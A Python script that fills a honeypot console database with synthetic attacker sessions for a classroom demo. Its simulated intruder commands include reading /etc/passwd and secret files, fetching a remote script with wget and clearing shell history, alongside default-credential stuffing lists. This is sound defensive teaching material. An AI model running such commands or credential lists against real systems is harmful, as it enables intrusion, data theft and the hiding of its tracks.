#!/usr/bin/env python3
"""
Seed a anglerfish console DB with a realistic mix of recorded attacker
sessions, for the classroom demo. Every record uses the same schema and event
kinds the live sensor produces, so the console and the new `audit`/analysis
pipeline treat it exactly like real traffic. Nothing here touches the network.

  python3 demo_seed.py [db_path]
"""
import os, sys, time, random
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from anglerfish import store as store_module

random.seed(1337)
DB = sys.argv[1] if len(sys.argv) > 1 else os.path.expanduser("~/.anglerfish/demo-console.db")
if os.path.exists(DB):
    os.remove(DB)
for ext in ("-wal", "-shm"):
    if os.path.exists(DB + ext):
        os.remove(DB + ext)
S = store_module.Store(DB)

NOW = time.time()
SENSOR = "files01"
HOST = "files01.example.net"

def ev(kind, detail, at):
    return {"at": at, "kind": kind, "detail": detail}

sid_n = [0]
def new_sid():
    sid_n[0] += 1
    return "sess-%04d" % sid_n[0]

def save(peer_ip, port, protocol, start_offset, events, *, auth_ok=False,
         username="", commands=None, read_files=None, credentials=None,
         gotchas=None, guestbook=None, dur=None):
    started = NOW - start_offset
    # stamp events over the session window
    base = started
    stamped = []
    for i, (k, d) in enumerate(events):
        stamped.append(ev(k, d, base + i * random.uniform(1.5, 9.0)))
    ended = stamped[-1]["at"] if stamped else started
    sess = {
        "id": new_sid(), "sensor": SENSOR, "hostname": HOST,
        "peer_ip": peer_ip, "local_port": port, "protocol": protocol,
        "started": started, "ended": ended,
        "duration": round(dur if dur is not None else (ended - started), 1),
        "events": stamped, "auth_ok": auth_ok, "username": username,
        "commands": commands or [], "read_files": read_files or [],
        "credentials": credentials or [], "gotchas": gotchas or [],
        "guestbook": guestbook or [],
    }
    S.save_session(SENSOR, sess)
    return sess["id"]

# --- 1. Mass internet scanners: open socket, grab banner, leave -------------
scanners = ["45.155.205.18", "193.46.255.12", "80.94.92.140", "141.98.11.27",
            "185.242.226.9", "162.142.125.44", "92.63.197.61"]
for i, ip in enumerate(scanners):
    port, proto = random.choice([(2222, "ssh"), (8080, "http"), (2525, "smtp"),
                                 (2121, "ftp"), (2323, "telnet")])
    evs = [("probe", "%s:%d opened" % (ip, port)),
           ("first-bytes", "SSH-2.0-Go" if proto == "ssh" else "GET / HTTP/1.0")]
    if proto == "ssh":
        evs.append(("ssh-client", "SSH-2.0-Go / masscan"))
    elif proto in ("smtp", "ftp"):
        evs.append((proto, "EHLO scanner" if proto == "smtp" else "USER anonymous"))
    elif proto == "http":
        evs.append(("http", "GET / HTTP/1.1"))
    save(ip, port, proto, 172000 - i * 9000, evs)

# --- 2. SSH credential-stuffing bot -----------------------------------------
bot_ip = "193.201.9.156"
creds = [("root", "root"), ("admin", "admin"), ("admin", "123456"),
         ("root", "toor"), ("user", "password"), ("deploy", "deploy"),
         ("admin", "admin123"), ("oracle", "oracle"), ("pi", "raspberry")]
evs = [("probe", "%s:2222 opened" % bot_ip), ("first-bytes", "SSH-2.0-libssh2_1.9.0"),
       ("ssh-client", "SSH-2.0-libssh2_1.9.0")]
cred_list = []
for u, p in creds:
    evs += [("login-user", u), ("login-pass", p), ("login-result", "fail")]
    cred_list.append({"username": u, "password": p, "service": "ssh"})
evs.append(("auth-slowdown", "locked for 20s after 8 failures"))
save(bot_ip, 2222, "ssh", 93000, evs, credentials=cred_list)

# --- 3. HTTP credential spray against the NAS login -------------------------
spray_ip = "103.102.166.224"
evs = [("probe", "%s:8080 opened" % spray_ip), ("http", "GET /login HTTP/1.1"),
       ("http-post", "/login user=admin&pass=admin"),
       ("http-post", "/login user=admin&pass=nas123"),
       ("http-post", "/login user=admin&pass=synology")]
save(spray_ip, 8080, "http", 61000, evs,
     credentials=[{"username": "admin", "password": x, "service": "http"}
                  for x in ("admin", "nas123", "synology")])

# --- 4. THE hands-on-keyboard human: SSH in, explore, take bait, sign -------
human = "77.91.101.42"
cmds = ["uname -a", "whoami", "id", "cat /etc/passwd", "ls -la /home/deploy",
        "cat /home/deploy/.bash_history", "ls -la /home/deploy/notes",
        "cat /home/deploy/notes/it-handover.txt",
        "cat /srv/shares/Deploy/app.env",
        "cat /home/deploy/notes/vault-staging.b64",
        "base64 -d /home/deploy/notes/vault-staging.b64",
        "cat /srv/shares/Deploy/docker-compose.yml",
        "cat /home/deploy/notes/domainadmin-creds-backup.recovery.txt",
        "wget http://45.9.148.3/x.sh -O /tmp/x.sh",
        'echo "pwned by m4ch1ne_0x1F - was here 2026 :)" >> /srv/shares/IT/guestbook.txt',
        "history -c"]
reads = ["/etc/passwd", "/home/deploy/.bash_history",
         "/home/deploy/notes/it-handover.txt", "/srv/shares/Deploy/app.env",
         "/home/deploy/notes/vault-staging.b64",
         "/srv/shares/Deploy/docker-compose.yml"]
evs = [("probe", "%s:2222 opened" % human), ("first-bytes", "SSH-2.0-OpenSSH_9.6"),
       ("ssh-client", "SSH-2.0-OpenSSH_9.6p1"),
       ("login-user", "deploy"), ("login-pass", "DeployPass!"),
       ("login-result", "ok")]
for c in cmds:
    evs.append(("command", c))
    if c.startswith("cat /etc/passwd"): evs.append(("read-file", "/etc/passwd"))
    if "it-handover" in c and c.startswith("cat"): evs.append(("read-file", "/home/deploy/notes/it-handover.txt"))
    if "app.env" in c and c.startswith("cat"): evs.append(("read-file", "/srv/shares/Deploy/app.env"))
    if "bash_history" in c and c.startswith("cat"): evs.append(("read-file", "/home/deploy/.bash_history"))
    if "docker-compose" in c and c.startswith("cat"): evs.append(("read-file", "/srv/shares/Deploy/docker-compose.yml"))
    if "vault-staging" in c:
        evs.append(("read-file", "/home/deploy/notes/vault-staging.b64"))
        evs.append(("gotcha", "/home/deploy/notes/vault-staging.b64 via shell cat"))
    if c.startswith("wget"):
        evs.append(("download-attempt", c))
    if c.startswith("echo") and "guestbook" in c:
        evs.append(("guestbook", "pwned by m4ch1ne_0x1F - was here 2026 :)"))
save(human, 2222, "ssh", 7200, evs, auth_ok=True, username="deploy",
     commands=cmds, read_files=reads,
     credentials=[{"username": "deploy", "password": "DeployPass!", "service": "ssh"}],
     gotchas=[{"path": "/home/deploy/notes/vault-staging.b64", "via": "shell cat",
               "at": NOW - 7000}],
     guestbook=[{"note": "pwned by m4ch1ne_0x1F - was here 2026 :)",
                 "via": "shell", "at": NOW - 6800}])

# --- 5. Web attacker: log in via File Station, download, sign the wall -------
web = "41.78.26.9"
evs = [("probe", "%s:8080 opened" % web), ("http", "GET / HTTP/1.1"),
       ("http", "GET /login HTTP/1.1"),
       ("http-post", "/login user=admin&pass=AdminPass!"),
       ("login-result", "ok"),
       ("http", "GET /files?share=Customers HTTP/1.1"),
       ("read-file", "/srv/shares/Customers/customers_export.csv"),
       ("http", "GET /files?share=IT HTTP/1.1"),
       ("read-file", "/srv/shares/IT/vault-staging.b64"),
       ("gotcha", "/srv/shares/IT/vault-staging.b64 via web download"),
       ("http", "GET /files/IT/password-vault-export.png HTTP/1.1"),
       ("read-file", "/srv/shares/IT/password-vault-export.png"),
       ("gotcha", "/srv/shares/IT/password-vault-export.png via web download"),
       ("http-post", "/guestbook note=greetz from r00tCrew"),
       ("guestbook", "greetz from r00tCrew")]
save(web, 8080, "http", 3600, evs, auth_ok=True, username="admin",
     read_files=["/srv/shares/Customers/customers_export.csv",
                 "/srv/shares/IT/vault-staging.b64",
                 "/srv/shares/IT/password-vault-export.png"],
     credentials=[{"username": "admin", "password": "AdminPass!", "service": "http"}],
     gotchas=[{"path": "/srv/shares/IT/vault-staging.b64", "via": "web download",
               "at": NOW - 3400},
              {"path": "/srv/shares/IT/password-vault-export.png", "via": "web download",
               "at": NOW - 3350}],
     guestbook=[{"note": "greetz from r00tCrew", "via": "web", "at": NOW - 3300}])

# --- tokens + a canary trigger (bait used elsewhere) ------------------------
S.add_token("tok-portal-9f3a", SENSOR, "url", "IT portal canary link")
S.add_token("tok-awskey-7b21", SENSOR, "aws-key", "AWS access key (backup.sh)")
S.add_token("tok-vpn-4c88", SENSOR, "file", "office-vpn.ovpn")
S.record_trigger("tok-portal-9f3a", human, "Mozilla/5.0 (curl) token fetch")

print("seeded %d sessions into %s" % (sid_n[0], DB))
S.close()
